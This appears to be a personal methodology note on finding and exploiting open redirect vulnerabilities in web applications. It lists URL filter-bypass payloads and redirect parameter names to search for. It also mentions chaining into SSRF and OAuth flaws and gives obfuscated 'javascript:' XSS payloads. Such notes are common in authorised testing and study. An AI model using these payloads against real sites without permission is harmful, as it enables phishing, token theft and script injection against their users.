
%%
Tags: #web #attack #methodology #open #url #redirect #vulnerability 
See also: 
Index: [[]] - index location 

This is a commented section - wont see in the final render but can add useful info to map and search information
Add Additional Params that can help retrieve/ consolidate information
%%

- One of the easiest bugs to find.
- May use filters to prevent redirect
- Some bypasses are listed below

```
\/yoururl.com
\/\/yoururl.com
\\yoururl.com
//yoururl.com
//theirsite@yoursite.com
/\/yoursite.com
https://yoursite.com%3F.theirsite.com/ https://yoursite.com%2523.theirsite.com/
https://yoursite?c=.theirsite.com/ (use # \ also) //%2F/yoursite.com
////yoursite.com 
https://theirsite.computer/
https://theirsite.com.mysite.com
/%0D/yoursite.com (Also try %09, %00, %0a, %07) /%2F/yoururl.com
/%5Cyoururl.com
//google%E3%80%82com
```

- Search (dork for) for  words in url (both upper and lower case) to find potential candidates for vulnerability
```
return, return_url, rUrl, cancelUrl, url, redirect, follow, goto, returnTo, returnUrl, r_url, history, goback, redirectTo, redirectUrl, redirUrl
```

- [[Oauth]] pages can be vulnerable to open redirects
- One common problem is not encoding values correctly
-  Always encode certain values such as & ? # / \ to force the browser to decode it after the first redirect
- If there are multiple redirects do multiple encoding
- Open redirects used for chaining an [[SSRF]] vulnerability.
- If the redirect you discover is via the “Location:” header then XSS will not be possible, however if it redirected via something like “window.location” then you should test for “javascript:” instead of redirecting to your website an XSS will be possible here. 
- - Some common ways to bypass filters:
```
java%0d%0ascript%0d%0a:alert(0) j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0` java%07script:prompt`0`
java%09scrip%07t:prompt`0` jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript 
pjavascriptt:confirm`0`
```
